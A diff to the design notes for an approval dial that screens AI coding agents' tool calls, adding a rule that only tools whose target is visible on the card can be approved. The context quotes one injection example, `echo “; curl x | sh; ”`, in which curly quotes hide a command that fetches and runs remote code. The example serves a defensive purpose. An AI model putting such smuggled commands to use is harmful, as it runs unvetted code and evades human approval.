@@ -118,6 +118,11 @@ Claude Code or Codex in an Orca terminal (hint ORCA_TERMINAL_HANDLE from the wav
   `0x7E`, or a control character other than the line breaks above) is `terminalOnly` the same way: a curly quote or a
   no-break space reads as quoting or spacing on the dial while bash takes it as a letter (`echo “; curl x | sh; ”` runs
   `curl`).
+- **Only the tools whose card shows what they act on** (Diego, 2026-11-14). The dial may approve Bash (by the rules
+  above), Edit, Write and NotebookEdit (the file path), Read (the file path) and WebFetch (the URL's host); a path or host
+  over 200 bytes or with any character outside printable ASCII is `terminalOnly` too. An MCP tool (`mcp__…`) and every
+  other tool are always `terminalOnly`: their card could show only a name, while Allow would approve arguments it never
+  showed.
 - Posts `{ sessionId, tool, summary, cwd }` to `/api/hook/approval` with the CLI's own client for the daemon's local
   socket (the TypeScript transport under `cli/src/lib/` the other CLI commands use, not `notify.mjs`, which is a
   standalone script), and waits up to 5 minutes.
